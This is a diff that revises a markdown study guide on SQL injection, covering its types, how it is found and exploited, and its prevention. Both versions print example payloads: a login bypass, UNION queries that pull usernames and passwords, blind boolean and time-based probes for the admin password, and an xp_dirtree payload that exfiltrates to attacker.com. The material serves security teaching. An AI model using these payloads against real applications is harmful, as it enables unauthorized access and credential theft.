@@ -1,202 +1,186 @@
-# SQL Injection (SQLi)
+# SQL Injection
 
-## CONTENTS
-1. [What is SQL Injection?](#1-what-is-sql-injection)
-2. [Impact of SQL Injection Vulnerabilities](#2-impact-of-sql-injection-vulnerabilities)
-3. [Common Types of SQL Injection](#3-common-types-of-sql-injection)
-   - [In-Band SQL Injection](#31-in-band-sql-injection)
-     - [Error-Based SQL Injection](#311-error-based-sql-injection)
-     - [Union-Based SQL Injection](#312-union-based-sql-injection)
-   - [Inferential (Blind) SQL Injection](#32-inferential-blind-sql-injection)
-     - [Boolean-Based SQL Injection](#321-boolean-based-sql-injection)
-     - [Time-Based SQL Injection](#322-time-based-sql-injection)
-   - [Out-of-Band SQL Injection](#33-out-of-band-sql-injection)
-4. [How to Find SQL Injection Vulnerabilities](#4-how-to-find-sql-injection-vulnerabilities)
-5. [Prevention of SQL Injection Vulnerabilities](#5-prevention-of-sql-injection-vulnerabilities)
-6. [References](#6-references)
+## Table Of Contents
+
+- [What Is SQL Injection](#what-is-sql-injection)
+- [How To Find SQL Injection Vulnerabilities](#how-to-find-sql-injection-vulnerabilities)
+- [How To Exploit SQL Injection Vulnerabilities](#how-to-exploit-sql-injection-vulnerabilities)
+- [How To Prevent SQL Injection Vulnerabilities](#how-to-prevent-sql-injection-vulnerabilities)
 
 ---
 
-## 1. What is SQL Injection?
+## What Is SQL Injection?
 
-SQL Injection (SQLi) is a vulnerability where an attacker interferes with the SQL queries an application makes to its database. By manipulating input fields or URLs, attackers can access, modify, or delete sensitive data in the database.
+SQL Injection is a vulnerability that allows an attacker to interfere with the SQL queries an application makes to a database.
 
-**Example**:
-- Input: `admin'--`
-- Query: `SELECT * FROM users WHERE username = 'admin'--' AND password = '';`
-- Result: Logs in as admin without needing the password.
+#### Example:
+1. User Input:
 
-SQL Injection occurs when attackers inject malicious SQL code into user input fields or URLs to execute unauthorized database queries. This can lead to data theft, modification, or even remote code execution.
+`Username: admin'-- Password: (leave blank)`
 
-**Example Scenario**:
-1. User logs into a web application with `username` and `password`.
-2. The attacker injects SQL code into the username field: `admin'--`.
-3. The application executes the query, logging the attacker in as admin.
+2. Backend Query:
 
----
+```sql
+SELECT * FROM users WHERE username = 'admin'--' AND password = '';
+```
 
-## 2. Impact of SQL Injection Vulnerabilities
+3. Result: 
+   * Attacker gains unauthorized access as the admin user.
 
-1. **Confidentiality**:
-   - Unauthorized access to sensitive data such as usernames, passwords, and credit card numbers.
-2. **Integrity**:
-   - Attackers can modify or corrupt database records.
-3. **Availability**:
-   - SQL Injection can be used to delete critical data, rendering the application unusable.
+### Impact of SQL Injection Attacks
+
+- **Confidentiality**: SQLi can expose sensitive information, such as usernames and passwords.
+- **Integrity**: SQLi can alter database data.
+- **Availability**: SQLi can delete or modify data, impacting application functionality.
+- **Remote Code Execution**: SQLi can execute commands on the operating system.
 
 ---
 
-## 3. Common Types of SQL Injection
+### Types of SQL Injection
 
-### 3.1. In-Band SQL Injection
+1. **In-Band (Classic)**
 
-**Theory**  
-In-band SQLi occurs when the attacker uses the same communication channel to launch the attack and gather the results.
-
-**Categories**:
-- **Error-Based SQL Injection**
-- **Union-Based SQL Injection**
-
-#### 3.1.1. Error-Based SQL Injection
-
-**Theory**  
-Error-based SQLi forces the database to generate error messages, revealing information that helps refine the injection.
-
-**Steps to Exploit**:
-1. Submit SQL-specific characters (`'`, `"`) and look for errors.
-2. Example:
-   - Input: `www.example.com/app?id='`
-   - Output: `You have an error in your SQL syntax...`
-
----
-
-#### 3.1.2. Union-Based SQL Injection
-
-**Theory**  
-Union-based SQLi leverages the `UNION` operator to combine results of multiple queries into a single output.
-
-**Steps to Exploit**:
-1. Identify the number of columns:
-   - Incrementally inject `ORDER BY` clauses until an error occurs.
-   - Example: `ORDER BY 1--`, `ORDER BY 2--`, `ORDER BY 3--`.
-2. Find columns with useful data types:
-   - Inject payloads to test each column:  
-     `' UNION SELECT 'a',NULL--`  
-     `' UNION SELECT NULL,'a'--`
-
-**Example Payload**:
-`www.example.com/app?id=1 UNION SELECT username, password FROM users--`
-
----
-
-### 3.2. Inferential (Blind) SQL Injection
-
-**Theory**  
-Blind SQLi occurs when there is no direct data transfer, but the attacker can infer information by observing the application's behavior.
-
-**Categories**:
-- **Boolean-Based SQL Injection**
-- **Time-Based SQL Injection**
-
-#### 3.2.1. Boolean-Based SQL Injection
-
-**Theory**  
-Uses Boolean conditions to infer data by observing application responses.
-
-**Steps to Exploit**:
-1. Submit a payload that evaluates to `TRUE`:
-   - `www.example.com/app?id=1 AND 1=1`.
-2. Submit a payload that evaluates to `FALSE`:
-   - `www.example.com/app?id=1 AND 1=2`.
-
-**Advanced Payload**:
-`www.example.com/app?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'`
-
----
-
-#### 3.2.2. Time-Based SQL Injection
-
-**Theory**  
-Relies on database delays to infer information.
-
-**Steps to Exploit**:
-1. Submit a payload to pause execution:
-   - `www.example.com/app?id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)`.
-2. Observe response times:
-   - If delayed, the condition is true.
-
----
-
-### 3.3. Out-of-Band SQL Injection
-
-**Theory**  
-Out-of-Band SQLi uses external communication (e.g., DNS, HTTP) to exfiltrate data. It is less common but effective when other techniques fail.
-
-**Example Payload**:
-`'; exec master..xp_dirtree '//attacker.com/a'--`
-
----
-
-## 4. How to Find SQL Injection Vulnerabilities
-
-### Steps for Manual Testing
-1. **Identify Input Points**:
-   - Map the application for user inputs (e.g., forms, query parameters, headers).
-2. **Inject Test Payloads**:
-   - Submit `'`, `"`, `--`, `#`, and observe responses.
-3. **Analyze Responses**:
-   - Look for:
-     - SQL errors (e.g., "syntax error").
-     - Differences in application behavior.
-
-### Automated Testing
-1. Use tools like:
-   - **sqlmap**: Automates SQLi detection and exploitation.
-     ```bash
-     sqlmap -u "http://example.com/app?id=1"
+   - **Error-Based SQLi**:
+     Exploits database error messages to gain information.  
+     **Example**:
+     ```vbnet
+     Input: www.example.com/app.php?id='
+     Output: Error: "You have an error in your SQL syntax..."
      ```
-   - **Burp Suite Scanner**: Identifies injection points during dynamic analysis.
-2. Monitor for anomalies:
-   - Unusual delays.
-   - Exfiltration requests.
+
+   - **Union-Based SQLi**:
+     Combines the results of two queries using the `UNION` SQL operator.  
+     **Example**:
+     ```vbnet
+     Input: www.example.com/app.php?id=' UNION SELECT username, password FROM users--
+     Output:
+     admin / password123  
+     user / password456
+     ```
+
+2. **Inferential (Blind)**
+
+   - **Boolean-Based SQLi**:
+     Exploits differences in application responses based on TRUE or FALSE conditions.  
+     **Example**:
+     ```python
+     Payload: id=1 AND 1=1 (True)
+     Payload: id=1 AND 1=2 (False)
+     ```
+
+   - **Time-Based SQLi**:
+     Relies on database delays to infer information.  
+     **Example**:
+     ```css
+     Payload: id=1 AND IF(SUBSTRING(password, 1, 1)='a', SLEEP(5), 0)
+     ```
+
+3. **Out-of-Band (OAST)**
+
+   - Exploits out-of-band channels, such as DNS or HTTP, to exfiltrate data.  
+     **Example**:
+     ```arduino
+     Payload: '; exec master..xp_dirtree '//attacker.com/a'--
+     ```
 
 ---
 
-## 5. Prevention of SQL Injection Vulnerabilities
+## How to Find SQL Injection Vulnerabilities
+
+### Black-Box Testing
+- Map the application and test its inputs.
+- Submit SQL-specific payloads such as `'` or `"` and look for errors.
+- Submit Boolean conditions like `OR 1=1` or `OR 1=2` to observe differences in responses.
+- Use time-delay payloads to test for Time-Based SQLi.
+- Submit out-of-band payloads to monitor for external network interactions.
+
+### White-Box Testing
+- Enable web server and database logging.
+- Perform a regex search for database queries in the code.
+- Review all input points in the application code for potential SQLi vulnerabilities.
+- Ensure proper input validation and query parameterization.
+
+---
+
+## How to Exploit SQL Injection Vulnerabilities
+
+### Exploiting Error-Based SQLi
+- Submit SQL-specific characters like `'` or `"` and observe error messages.
+- Use the information revealed in errors to refine the payload.
+
+### Exploiting Union-Based SQLi
+1. Determine the number of columns using `ORDER BY` or `NULL` payloads:
+
+   ```sql
+   Input: UNION SELECT NULL--
+   Input: UNION SELECT NULL, NULL--
+   ```
+
+2. Identify columns with useful data types by injecting strings into each column:
+`Payload: UNION SELECT 'test', NULL--`
+
+3. Extract data by combining results with the UNION operator.
+
+### Exploiting Boolean-Based SQLi
+
+Submit payloads with Boolean conditions to observe responses:
+
+```sql
+Input: id=1 AND 1=1 (True)
+Input: id=1 AND 1=2 (False)
+```
+
+### Exploiting Time-Based SQLi
+
+Use payloads that delay responses:
+
+```sql
+Input: id=1 AND IF(SUBSTRING(password, 1, 1)='a', SLEEP(5), 0)
+```
+
+### Exploiting Out-of-Band SQLi
+
+Submit payloads to trigger out-of-band interactions:
+
+```sql
+Payload: '; exec master..xp_dirtree '//attacker.com/a'--
+```
+## How to Prevent SQL Injection Vulnerabilities
 
 ### Primary Defenses
 
 1. **Prepared Statements (Parameterized Queries)**:
-   - Always use placeholders for user inputs.
-
-   **Example**:  
-   `query = "SELECT * FROM users WHERE username = ? AND password = ?"`
+   - Use placeholders for user inputs instead of directly embedding them into queries.
 
 2. **Stored Procedures**:
-   - Encapsulate queries in stored procedures, ensuring parameterized calls.
+   - Use parameterized stored procedures for database interactions.
 
 3. **Whitelist Input Validation**:
-   - Define acceptable inputs and reject everything else.
+   - Define and enforce valid input formats.
 
 4. **Escaping User Input**:
-   - Escape special characters in inputs as a last resort.
+   - Escape special characters in user inputs as a last resort.
 
 ---
 
 ### Additional Defenses
 
 1. **Enforce Least Privilege**:
-   - Use minimal database privileges for the application.
-   - Disable unused database functions.
+   - Restrict database user permissions to only what is necessary.
 
-2. **Regularly Apply Security Patches**:
-   - Ensure the database is updated with vendor patches.
+2. **Database Hardening**:
+   - Apply CIS benchmarks and security patches.
+
+3. **Input Validation**:
+   - Validate user inputs against a strict whitelist.
 
 ---
 
-## 6. References
+## Resources
 
-- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)  
-- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
-- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)  
-- [PentestMonkey – SQL Injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)  
+- [Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [PentestMonkey - SQL Injection Cheat Sheet](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
+- [sqlmap](https://github.com/sqlmapproject/sqlmap)
+
